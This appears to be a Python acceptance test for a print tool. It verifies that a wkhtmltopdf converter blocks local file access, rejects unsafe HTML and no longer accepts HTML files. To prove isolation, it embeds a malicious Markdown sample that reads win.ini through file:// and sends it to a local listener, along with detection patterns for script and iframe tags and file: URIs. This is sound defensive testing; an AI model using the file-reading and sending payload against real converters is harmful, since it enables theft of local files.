#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""verify_wkhtmltopdf_isolation.py — S0-09：转换器 wkhtmltopdf 隔离 + 删除 HTML 支持 + 4.5.32

对应 docs/安全加固修复计划_2026-10-23.md §4「S0-09」与附录 A-7（DS-01 根治；D-2 已拍板
**永久拒绝** HTML，不是"隔离后继续支持"）。

判据分三层，任何一层不满足即 exit 1：

  A 静态（converter.py）
    - wkhtmltopdf 命令行**不含**「允许本地文件访问」开关（--enable-local-file-access）；
    - 命令行**含** --disable-javascript；JS 关闭后失去意义的 --no-stop-slow-scripts /
      --javascript-delay 已移除；90 s 进程超时保留；
    - _scan_unsafe_html 存在、覆盖 8 类危险语法（file:/UNC/<script/<iframe/<object/
      <embed/on…=/data:text/html），且在 Markdown 转换**之前**被调用；
    - _inline_local_images 存在（附录 A-7：删掉本地文件访问后必须自己把本地图片内联成
      data: URI，单文件 ≤10MB、合计 ≤50MB，仅限输入文件同目录及子目录），且在转换前调用；
    - 扩展名表**没有** .html/.htm 注册；_convert_html_to_pdf 保留（仅供 Markdown 内部调用）。

  B 静态（gui.py / version_info.txt / 移动端）
    - 文件对话框「文本」过滤器无 *.html / *.htm；_format_engine_label 无 html/htm 引擎分支；
      __add_files_to_table_impl 的准入集合无 html/htm，且拒绝时给明确文案；
    - 拒绝文案 =「本工具已不支持 HTML 文件，请另存为 PDF/DOCX 后打印」；
    - APP_VERSION 与 version_info.txt 同步为 4.5.32；
    - 移动端小程序 supportedExts 与 APP SUPPORTED_EXTS 本就**不含** html/htm（只断言，不改）。

  C 动态（本机 shutil.which("wkhtmltopdf") 找不到 → SKIP 该节，脚本仍 exit 0）
    - 恶意 Markdown（<img src="file:///C:/Windows/win.ini"> + XHR 读 file:// 后外发到
      127.0.0.1 本地监听端口）：转换被明确拒绝，监听端口收到 **0** 个请求，产物不含 marker；
    - 本地相对路径图片：内联成 data: URI；越界/缺失/超限一律明确失败（不静默少印）；
    - 带本地图片的正常 Markdown 仍能转换成功，且 PDF 里**确实有图片对象**（不是少印）。

  D 反向验证（`--no-reverse` 可跳过）
    - 用 `git show 8eeb282:<path>` 取改前版本，临时覆盖 converter.py / gui.py，
      再用 `--static-only` 跑本脚本：**必须变红**（exit != 0），且红必须落在断言上
      （出现「✗ FAIL」，不得是 NameError/ImportError/SyntaxError/Traceback）；
    - finally 无条件还原 + 逐个核对 md5；中途被杀则下次运行时按 tempdir 里的备份标记
      自动还原（_recover_stale_swap）。

用法：
    python tests/verify_wkhtmltopdf_isolation.py                # 全量（含反向验证）
    python tests/verify_wkhtmltopdf_isolation.py --static-only  # 只跑静态（反向验证内部用）
    python tests/verify_wkhtmltopdf_isolation.py --no-reverse   # 正向全量，不做反向验证

退出码：0 = 全绿（含"本机无 wkhtmltopdf"的 SKIP）；1 = 有断言失败。
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
LP = ROOT / "local_print_tool"
BASELINE = "8eeb282"          # 本次改动前的最后一个提交（改前版本来源）

CONV_PATH = "local_print_tool/converter.py"
GUI_PATH = "local_print_tool/gui.py"
VI_PATH = "local_print_tool/version_info.txt"

HTML_UNSUPPORTED_MSG = "本工具已不支持 HTML 文件，请另存为 PDF/DOCX 后打印"

# 1x1 PNG（PIL 不可用时的兜底，只用于"图片能内联/能转换"的判据）
_PNG_1X1 = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGA"
    "hKmMIQAAAABJRU5ErkJggg=="
)

_passes = 0
_failures: list[str] = []


def check(name: str, cond: bool, detail: str = "") -> bool:
    """记录一条断言（不抛异常，跑完统一判）。"""
    global _passes
    if cond:
        _passes += 1
        print(f"  ✓ {name}")
        return True
    _failures.append(name + (f" —— {detail}" if detail else ""))
    print(f"  ✗ FAIL {name}" + (f" —— {detail}" if detail else ""))
    return False


def section(title: str) -> None:
    print(f"\n=== {title} ===")


# ============================================================
# 静态断言
# ============================================================

def _cmd_block(src: str) -> str:
    """从 `def _convert_html_to_pdf` 里抠出 `cmd = [...]` 那段（只看真实命令行）。"""
    i = src.index("def _convert_html_to_pdf")
    j = src.index("cmd = [", i)
    k = src.index("]", j)
    return src[j:k + 1]


def static_converter_checks() -> None:
    section("A. 静态断言：converter.py（命令行 / 扫描器 / 图片内联 / 扩展名表）")
    conv = (ROOT / CONV_PATH).read_text(encoding="utf-8")
    try:
        block = _cmd_block(conv)
    except ValueError as e:                     # 命令行被删/改形状 → 直接判红
        check("能找到 wkhtmltopdf 命令行（cmd = [...]）", False, str(e))
        return

    # ── 命令行 ──
    check("命令行不含「允许本地文件访问」开关（--enable-local-file-access）",
          "--enable-local-file-access" not in conv,
          "该参数会让顾客文档读走本机任意文件（DS-01）")
    check("命令行含 --disable-javascript",
          "--disable-javascript" in block, f"cmd block={block!r}")
    check("converter.py 全文不含 --no-stop-slow-scripts（JS 已关，无意义）",
          "--no-stop-slow-scripts" not in conv)
    check("converter.py 全文不含 --javascript-delay（JS 已关，无意义）",
          "--javascript-delay" not in conv)
    check("仍保留 90 s 进程超时（timeout=90）", "timeout=90" in conv)

    # ── 危险语法扫描 ──
    check("_scan_unsafe_html 已定义", "def _scan_unsafe_html(" in conv)
    bs4 = chr(92) * 4                            # 源码里的正则 r"\\\\" = 两个反斜杠
    patterns = [
        ("file:", r're.compile(r"file:"'),
        ("UNC（\\\\server）", f're.compile(r"{bs4}")'),
        ("<script", r're.compile(r"<\s*script"'),
        ("<iframe", r're.compile(r"<\s*iframe"'),
        ("<object", r're.compile(r"<\s*object"'),
        ("<embed", r're.compile(r"<\s*embed"'),
        ("on…=", r're.compile(r"\bon\w+\s*="'),
        ("data:text/html", r're.compile(r"data\s*:\s*text/html"'),
    ]
    for label, frag in patterns:
        check(f"扫描器覆盖 {label}", frag in conv, f"期望片段: {frag}")
    check("拒绝文案含「文档包含不安全内容」", "文档包含不安全内容" in conv)

    # ── 调用顺序：先扫描、先内联，再转换 ──
    i_scan = conv.find("_scan_unsafe_html(html)")
    i_inline = conv.find("_inline_local_images(html,")
    i_conv = conv.find("_convert_html_to_pdf(html, output_pdf, is_content=True)")
    check("Markdown 转换前先跑 _scan_unsafe_html",
          0 <= i_scan < i_conv, f"i_scan={i_scan}, i_conv={i_conv}")
    check("Markdown 转换前先做 _inline_local_images",
          0 <= i_inline < i_conv, f"i_inline={i_inline}, i_conv={i_conv}")

    # ── 本地图片内联（附录 A-7） ──
    check("_inline_local_images 已定义", "def _inline_local_images(" in conv)
    check("单文件图片上限 10MB", "_MAX_INLINE_IMAGE_BYTES = 10 * 1024 * 1024" in conv)
    check("图片合计上限 50MB", "_MAX_INLINE_IMAGE_TOTAL_BYTES = 50 * 1024 * 1024" in conv)
    check("内联产物是 data: URI", "data:{mime};base64," in conv)
    check("仅允许输入文件同目录及子目录（commonpath 校验）",
          "os.path.commonpath([base, target]) == base" in conv)

    # ── 扩展名表 ──
    check('扩展名表没有 .html 注册', 'cm[".html"]' not in conv)
    check('扩展名表没有 .htm 注册', 'cm[".htm"]' not in conv)
    check("Markdown 仍是注册类型", 'cm[".md"] = _convert_markdown_to_pdf' in conv)
    check("_convert_html_to_pdf 保留（仅供 Markdown 内部调用）",
          "def _convert_html_to_pdf(" in conv and "_convert_html_to_pdf(html, output_pdf" in conv)


def static_gui_checks() -> None:
    section("B. 静态断言：gui.py / version_info.txt")
    gui = (ROOT / GUI_PATH).read_text(encoding="utf-8")
    vi = (ROOT / VI_PATH).read_text(encoding="utf-8")

    # ── 文件对话框过滤 / 引擎标签 ──
    check("文件对话框过滤器不含 *.html", "*.html" not in gui)
    check("文件对话框过滤器不含 *.htm", "*.htm" not in gui)
    check('_format_engine_label 无 html/htm 分支（不返回 "wkhtmltopdf"）',
          'return "wkhtmltopdf"' not in gui
          and 'if ext in (".html", ".htm"):\n        return "wkhtmltopdf"' not in gui)

    # ── 准入集合 ──
    try:
        seg = gui[gui.index("allowed_types = {"):]
        seg = seg[:seg.index("}")]
    except ValueError:
        seg = ""
    check("__add_files_to_table_impl 准入集合无 .html/.htm",
          bool(seg) and ".html" not in seg and ".htm" not in seg, f"allowed_types={seg!r}")
    check('准入处对 .html/.htm 有显式拒绝分支（ext in (".html", ".htm")）',
          'ext in (".html", ".htm")' in gui)
    check("拒绝文案原样就位", HTML_UNSUPPORTED_MSG in gui)
    check("拒绝文案经 _warn_html_unsupported 统一给（拖入/粘贴/对话框共用）",
          "def _warn_html_unsupported(" in gui
          and "self._warn_html_unsupported(html_rejected)" in gui)

    # ── 版本号 ──
    # 判据是「两处同步」而不是「等于某个写死的版本号」：后者每发一版都要改验收脚本，
    # 2026-10-23 发 4.5.33 时就因此误红（红在断言上，不是真回归）。版本号本身由发版流程管。
    m_ver = re.search(r'APP_VERSION\s*=\s*"([0-9]+(?:\.[0-9]+)+)"', gui)
    ver = m_ver.group(1) if m_ver else ""
    check("gui.py 能取到 APP_VERSION", bool(ver), f"APP_VERSION={ver!r}")
    if ver:
        tuple_lit = "(" + ", ".join(ver.split(".")) + ", 0)"
        check(f"version_info.txt 与 APP_VERSION 同步（{ver}）",
              tuple_lit in vi and vi.count(f"u'{ver}'") >= 2,
              f"期望 {tuple_lit} 与 u'{ver}' 各出现（filevers/prodvers/FileVersion/ProductVersion），"
              f"实际 tuple={tuple_lit in vi} 次数={vi.count(chr(117) + chr(39) + ver + chr(39))}")


def static_mobile_checks() -> None:
    section("C. 静态断言：移动端 supportedExts 不含 html/htm（只断言，不改文件）")
    mini = ROOT / "mobile_apps/h_n_print/pages/index/index.js"
    app = ROOT / "mobile_apps/android_app/www/print.js"
    check("小程序 index.js 存在", mini.is_file())
    check("Android print.js 存在", app.is_file())
    for label, path, var in (
        ("小程序", mini, "supportedExts"),
        ("Android", app, "SUPPORTED_EXTS"),
    ):
        if not path.is_file():
            continue
        text = path.read_text(encoding="utf-8")
        m = re.search(rf"{var}\s*=\s*\[(.*?)\]", text, re.S)
        seg = m.group(1) if m else ""
        check(f"{label} {var} 能找到", bool(seg))
        check(f"{label} {var} 不含 .html/.htm",
              bool(seg) and not re.search(r"\.html|\.htm", seg), f"{seg!r}")


# ============================================================
# 动态断言（本机 wkhtmltopdf）
# ============================================================

def _make_png(path: Path) -> None:
    try:
        from PIL import Image
        Image.new("RGB", (16, 16), (200, 40, 40)).save(path)
    except Exception:                            # noqa: BLE001 — 兜底用内置 1x1 PNG
        path.write_bytes(_PNG_1X1)


def _expect_runtime_error(fn, needle: str) -> str:
    """跑 fn()，期望抛 RuntimeError 且文案含 needle；返回实际文案（未抛则空串）。"""
    try:
        fn()
    except RuntimeError as e:
        return str(e)
    except Exception as e:                       # noqa: BLE001 — 错类型也算不符
        return f"<{type(e).__name__}: {e}>"
    return ""


def dynamic_checks() -> None:
    section("D. 动态断言（本机 wkhtmltopdf）")
    sys.path.insert(0, str(LP))
    try:
        import converter
    except Exception as e:                       # noqa: BLE001
        check("能导入 converter", False, f"{type(e).__name__}: {e}")
        return

    # 先按任务口径用 shutil.which 判；为空时再用程序自己的查找链（_find_wkhtmltopdf，
    # 覆盖「装在 Program Files 但不在 PATH」的门店机）—— 两者都空才 SKIP。
    wk = shutil.which("wkhtmltopdf") or converter._find_wkhtmltopdf()
    if not wk:
        print("  SKIP 未找到 wkhtmltopdf（shutil.which 与 _find_wkhtmltopdf 均为空）"
              "—— 动态节跳过，退出码仍为 0")
        return
    print(f"  使用 wkhtmltopdf: {wk}")

    # ── D1. 扫描器：8 类危险语法都要拒；安全内容不误伤 ──
    bad_html = [
        ('<img src="file:///C:/Windows/win.ini">', "file:"),
        ("<p>\\\\server\\share\\a.txt</p>", "UNC"),
        ("<script>alert(1)</script>", "<script"),
        ('<iframe src="x"></iframe>', "<iframe"),
        ('<object data="x"></object>', "<object"),
        ('<embed src="x">', "<embed"),
        ('<p onclick="alert(1)">x</p>', "on…="),
        ('<a href="data:text/html;base64,AAA">x</a>', "data:text/html"),
    ]
    for html, label in bad_html:
        try:
            converter._scan_unsafe_html(f"<html><body>{html}</body></html>")
            got = ""
        except RuntimeError as e:
            got = str(e)
        check(f"扫描器拒绝 {label}", "文档包含不安全内容" in got, f"实际: {got[:120]!r}")
    try:
        converter._scan_unsafe_html(
            "<html><body><h1>正常</h1><p>表格 1 2 3</p>"
            '<img src="data:image/png;base64,AAAA"></body></html>')
        check("扫描器不误伤正常 Markdown 渲染结果", True)
    except Exception as e:                       # noqa: BLE001
        check("扫描器不误伤正常 Markdown 渲染结果", False, f"{type(e).__name__}: {e}")

    tmp = Path(tempfile.mkdtemp(prefix="hn_wk_iso_"))
    try:
        # ── D2. 图片内联：正常/越界/缺失/超限 ──
        pic = tmp / "pic.png"
        _make_png(pic)
        inline = converter._inline_local_images('<p><img src="pic.png" alt="p"></p>', str(tmp))
        check("本地相对路径图片内联成 data: URI",
              "data:image/png;base64," in inline and "pic.png" not in inline,
              inline[:160])

        outside_dir = Path(tempfile.mkdtemp(prefix="hn_wk_out_"))
        outside = outside_dir / "o.png"
        _make_png(outside)
        msg = _expect_runtime_error(
            lambda: converter._inline_local_images(f'<img src="{outside}">', str(tmp)),
            "目录之外")
        check("输入文件目录之外的图片被拒绝（不读本机其它文件）",
              "目录之外" in msg, msg[:160])

        msg = _expect_runtime_error(
            lambda: converter._inline_local_images('<img src="nope.png">', str(tmp)),
            "不存在")
        check("缺失的本地图片明确失败（不静默少印）", "不存在" in msg, msg[:160])

        big = tmp / "big.png"
        big.write_bytes(b"")
        with open(big, "r+b") as f:
            f.truncate(11 * 1024 * 1024)         # 稀疏文件，只造 11MB 体积
        msg = _expect_runtime_error(
            lambda: converter._inline_local_images('<img src="big.png">', str(tmp)),
            "过大")
        check("单文件超过 10MB 明确失败（不静默少印）", "过大" in msg, msg[:160])

        # ── D3. 恶意 Markdown：拒绝 + 本地监听端口 0 请求 + 产物无 marker ──
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("127.0.0.1", 0))
        listener.listen(8)
        port = listener.getsockname()[1]
        hits: list[bytes] = []
        stop = threading.Event()

        def _serve() -> None:
            listener.settimeout(0.3)
            while not stop.is_set():
                try:
                    conn, _ = listener.accept()
                except (socket.timeout, OSError):
                    continue
                try:
                    conn.settimeout(0.5)
                    try:
                        hits.append(conn.recv(4096))
                    except OSError:
                        hits.append(b"")
                finally:
                    conn.close()

        srv = threading.Thread(target=_serve, daemon=True)
        srv.start()
        evil_md = tmp / "evil.md"
        evil_md.write_text(
            "# 恶意文档\n\n"
            '<img src="file:///C:/Windows/win.ini" alt="HNLEAKMARK1">\n\n'
            "<script>\n"
            "var x = new XMLHttpRequest();\n"
            'x.open("GET", "file:///C:/Windows/win.ini", false);\n'
            "x.send();\n"
            'new Image().src = "http://127.0.0.1:%d/?d=" + encodeURIComponent(x.responseText);\n'
            "</script>\n" % port,
            encoding="utf-8",
        )
        evil_pdf = tmp / "evil.pdf"
        rejected, err = False, ""
        try:
            converter.get_converter().convert(str(evil_md), str(evil_pdf))
        except Exception as e:                   # noqa: BLE001 — 转换失败即预期
            rejected = True
            err = f"{type(e).__name__}: {e}"
        time.sleep(0.6)                          # 给"万一真的发了请求"留出接收窗口
        stop.set()
        srv.join(timeout=2)
        listener.close()

        check("恶意文档转换被明确拒绝（文档包含不安全内容）",
              rejected and "文档包含不安全内容" in err, err[:200])
        check("本地监听端口收到 0 个请求（无外发）", not hits, f"hits={len(hits)}")
        pdf_bytes = evil_pdf.read_bytes() if evil_pdf.exists() else b""
        check("产物里不含 marker / win.ini 内容",
              b"HNLEAKMARK1" not in pdf_bytes and b"[fonts]" not in pdf_bytes.lower(),
              f"pdf={len(pdf_bytes)} bytes")

        # ── D4. 正常 Markdown + 本地图片：转换成功且 PDF 里真有图片 ──
        good_md = tmp / "good.md"
        good_md.write_text("# 图片文档\n\n正文一段。\n\n![pic](pic.png)\n", encoding="utf-8")
        good_pdf = tmp / "good.pdf"
        gerr = ""
        try:
            converter.get_converter().convert(str(good_md), str(good_pdf))
        except Exception as e:                   # noqa: BLE001
            gerr = f"{type(e).__name__}: {e}"
        ok = good_pdf.is_file() and good_pdf.stat().st_size > 1000
        check("带本地图片的正常 Markdown 仍能转换成功", ok, gerr[:200])
        n_img = -1
        if ok:
            try:
                import fitz
                with fitz.open(str(good_pdf)) as doc:
                    n_img = len(doc[0].get_images(full=True))
            except Exception as e:               # noqa: BLE001
                n_img = -1
                gerr = f"fitz: {e}"
        check("PDF 里确实有图片对象（未被静默丢弃）", n_img >= 1, f"images={n_img} {gerr}")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


# ============================================================
# 反向验证：改前版本必须变红
# ============================================================

_BACKUP_MARK = Path(tempfile.gettempdir()) / "hn_s0_09_reverse_backup.json"


def _recover_stale_swap() -> None:
    """上次反向验证中途被杀（断电/强杀）时，用 tempdir 里的备份把源文件还原。"""
    if not _BACKUP_MARK.is_file():
        return
    try:
        data = json.loads(_BACKUP_MARK.read_text(encoding="utf-8"))
        for rel, backup in data.items():
            src = Path(backup)
            if src.is_file():
                (ROOT / rel).write_bytes(src.read_bytes())
                print(f"  ⚠ 已从上次中断的反向验证中还原 {rel}")
        _BACKUP_MARK.unlink()
    except Exception as e:                       # noqa: BLE001
        print(f"  ✗ 中断恢复失败（请手动 git checkout -- {CONV_PATH} {GUI_PATH}）: {e}")


def reverse_validation() -> None:
    section("E. 反向验证（把参数/denylist 改回去必须变红）")
    if not shutil.which("git"):
        print("  SKIP 未找到 git —— 反向验证跳过")
        return

    def _git_show(rel: str) -> bytes | None:
        p = subprocess.run(
            ["git", "-C", str(ROOT), "show", f"{BASELINE}:{rel}"],
            capture_output=True,
        )
        return p.stdout if p.returncode == 0 else None

    old_conv = _git_show(CONV_PATH)
    if not old_conv:
        print(f"  SKIP 基线 commit {BASELINE} 不可用（git show 失败）—— 反向验证跳过")
        return
    if not check(f"基线 {BASELINE} 的 converter.py 是改前版本（仍带本地文件访问开关）",
                 b"--enable-local-file-access" in old_conv):
        print("  （基线不是改前状态 ⇒ 无法作为反证，跳过）")
        return
    old_gui = _git_show(GUI_PATH)
    if not check(f"基线 {BASELINE} 的 gui.py 可取", bool(old_gui)):
        return

    files = [CONV_PATH, GUI_PATH]
    backup_dir = Path(tempfile.mkdtemp(prefix="hn_s0_09_backup_"))
    store: dict[str, bytes] = {}
    md5_before: dict[str, str] = {}
    for rel in files:
        data = (ROOT / rel).read_bytes()
        store[rel] = data
        md5_before[rel] = hashlib.md5(data).hexdigest()
        (backup_dir / Path(rel).name).write_bytes(data)
    _BACKUP_MARK.write_text(
        json.dumps({rel: str(backup_dir / Path(rel).name) for rel in files},
                   ensure_ascii=False),
        encoding="utf-8",
    )

    rc: int | None = None
    out = ""
    try:
        for rel, old in ((CONV_PATH, old_conv), (GUI_PATH, old_gui or b"")):
            (ROOT / rel).write_bytes(old)
        env = dict(os.environ)
        env["PYTHONUTF8"] = "1"
        env["PYTHONIOENCODING"] = "utf-8"
        env["HN_S0_09_CHILD"] = "1"             # 子进程不要跑"中断恢复"，否则刚换回旧版就被还原
        proc = subprocess.run(
            [sys.executable, str(Path(__file__).resolve()), "--static-only"],
            cwd=str(ROOT), env=env, capture_output=True, text=True,
            encoding="utf-8", errors="replace", timeout=180,
        )
        rc = proc.returncode
        out = (proc.stdout or "") + (proc.stderr or "")
    finally:
        for rel, data in store.items():
            (ROOT / rel).write_bytes(data)
        try:
            _BACKUP_MARK.unlink()
        except OSError:
            pass
        # 还原后逐个核对 md5（绝不把旧版留在工作树里）
        for rel in files:
            now = hashlib.md5((ROOT / rel).read_bytes()).hexdigest()
            if now != md5_before[rel]:
                check(f"反向验证后已还原 {rel}（md5 一致）", False,
                      f"{md5_before[rel]} → {now}")
            else:
                check(f"反向验证后已还原 {rel}（md5 一致）", True)

    shutil.rmtree(backup_dir, ignore_errors=True)

    check(f"改前版本跑本脚本必须失败（实际 exit={rc}）", rc is not None and rc != 0)
    check("红落在断言上（不是 NameError/ImportError/SyntaxError/Traceback）",
          "Traceback (most recent call last)" not in out
          and "NameError" not in out and "ImportError" not in out
          and "SyntaxError" not in out,
          out[-400:])
    check("失败输出里能看到具体断言（✗ FAIL …）", "✗ FAIL" in out)
    print("  改前版本输出的末尾 8 行（证明红在断言上）:")
    for line in out.strip().splitlines()[-8:]:
        print("    " + line)


# ============================================================
# main
# ============================================================

def main() -> int:
    args = set(sys.argv[1:])
    static_only = "--static-only" in args
    no_reverse = "--no-reverse" in args

    print("S0-09 验收：wkhtmltopdf 隔离 + 删除 HTML 支持 + 4.5.32")
    print(f"  仓库根: {ROOT}")
    print(f"  基线 commit: {BASELINE}（反向验证用）")

    if os.environ.get("HN_S0_09_CHILD") != "1":
        _recover_stale_swap()

    static_converter_checks()
    static_gui_checks()
    static_mobile_checks()
    if not static_only:
        dynamic_checks()
    if not static_only and not no_reverse:
        reverse_validation()

    print()
    if _failures:
        print(f"FAIL —— {len(_failures)} 条断言未通过（通过 {_passes} 条）：")
        for f in _failures:
            print("  - " + f)
        return 1
    print(f"PASS —— 全部 {_passes} 条断言通过")
    return 0


if __name__ == "__main__":
    sys.exit(main())
